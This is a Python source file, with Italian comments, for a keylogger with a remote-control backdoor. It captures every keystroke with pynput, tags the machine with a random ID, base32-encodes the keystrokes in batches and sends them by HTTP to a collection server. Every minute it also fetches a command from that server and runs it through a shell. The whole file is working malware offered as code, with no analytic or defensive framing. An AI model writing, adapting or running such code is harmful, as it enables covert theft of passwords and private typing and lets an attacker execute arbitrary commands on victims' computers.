import time
import threading
import requests
from pynput import keyboard
from collections import deque
import urllib.parse
import random
import string
import subprocess
import base64
import urllib.parse

# === Config ===
URL_SERVER = "http://localhost:5633"
codice_univoco = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
key_buffer = deque()

print(f"[INFO] Codice PC: {codice_univoco}")

# === Funzione per convertire i tasti ===
def key_to_str(key):
    try:
        return urllib.parse.quote(key.char)
    except AttributeError:
        return str(key).replace("'", "").replace("Key.", "").upper()

# === Listener per la tastiera ===
def on_press(key):
    key_str = key_to_str(key)
    print(f"[KEY] Hai premuto: {key_str}")
    key_buffer.append(key_str)

# === Worker thread per inviare i tasti ===
def invia_tasti():
    sub_buffer = []
    last_key_time = time.time()

    while True:
        now = time.time()

        if key_buffer:
            key_str = key_buffer.popleft()
            sub_buffer.append(key_str)
            last_key_time = now

            # Decodifico tutti i tasti in testo normale (raw chars)
            decoded_chars = [urllib.parse.unquote(c) for c in sub_buffer]
            combined_text = ''.join(decoded_chars)

            # Se abbiamo almeno 20 char raw (che diventano ~32 base32)
            if len(combined_text) >= 20:
                try:
                    # Prendo i primi 20 char raw da inviare
                    to_send_raw = combined_text[:20]

                    # Encode in base32
                    b32_encoded = base64.b32encode(to_send_raw.encode()).decode()

                    url = f"{URL_SERVER}/{codice_univoco}/{b32_encoded}"
                    requests.get(url, timeout=60)
                    print(f"[SEND base32 x32 chars] {to_send_raw}")

                    # Rimuovo i primi 20 char inviati da sub_buffer
                    remaining_raw = combined_text[20:]
                    # Ricostruisco sub_buffer con i caratteri rimasti in urlencoded
                    sub_buffer = [urllib.parse.quote(c) for c in remaining_raw]

                except Exception as e:
                    print(f"[RETRY base32] {to_send_raw} (errore: {e})")
                    # Rimetto tutto in coda nel buffer se errore
                    for c in reversed(sub_buffer):
                        key_buffer.appendleft(c)
                    sub_buffer = []

        elif sub_buffer and (now - last_key_time) >= 10:
            try:
                decoded_chars = [urllib.parse.unquote(c) for c in sub_buffer]
                combined_text = ''.join(decoded_chars)
                if combined_text:
                    b32_encoded = base64.b32encode(combined_text.encode()).decode()
                    url = f"{URL_SERVER}/{codice_univoco}/{b32_encoded}"
                    requests.get(url, timeout=60)
                    print(f"[SEND <32 timeout base32] {combined_text}")
                    sub_buffer = []
            except Exception as e:
                print(f"[RETRY <32 base32] {combined_text} (errore: {e})")
                for c in reversed(sub_buffer):
                    key_buffer.appendleft(c)
                sub_buffer = []

        time.sleep(0.1)

# === Avvio tutto ===
listener = keyboard.Listener(on_press=on_press)
listener.start()

threading.Thread(target=invia_tasti, daemon=True).start()

# === Loop comando remoto (opzionale) ===
def controlla_leggi_esegui_script():
    try:
        url = f"{URL_SERVER}/payloads_httpcmd/default.txt"
        response = requests.get(url, timeout=60)
        comando = response.text.strip()
        if comando:
            print(f"[CMD] Esecuzione: {comando}")
            subprocess.run(comando, shell=True)
    except:
        pass

# NumPad che funziona
def key_to_str(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            return urllib.parse.quote(str(key.char))
        else:
            # Se è un tasto speciale tipo spazio o backspace
            if str(key) == "Key.space":
                return " "
            elif str(key) == "Key.backspace":
                return "BACKSPACE"
            elif str(key) == "Key.shift":
                return ""
            # Se è numpad ecc, mappa come prima
            vk = key.vk if hasattr(key, 'vk') else None
            numpad_map = {
                96: "NUMPAD_0",
                97: "NUMPAD_1",
                98: "NUMPAD_2",
                99: "NUMPAD_3",
                100: "NUMPAD_4",
                101: "NUMPAD_5",
                102: "NUMPAD_6",
                103: "NUMPAD_7",
                104: "NUMPAD_8",
                105: "NUMPAD_9",
                110: "NUMPAD_DOT",
                107: "NUMPAD_PLUS",
                109: "NUMPAD_MINUS",
                106: "NUMPAD_MULT",
                111: "NUMPAD_DIV",
            }
            if vk in numpad_map:
                return numpad_map[vk]

            # Altrimenti fallback con nome tasto
            return str(key).replace("'", "").replace("Key.", "").upper()
    except Exception as e:
        return f"UNKNOWN_{str(e)}"



while True:
    controlla_leggi_esegui_script()
    time.sleep(60)
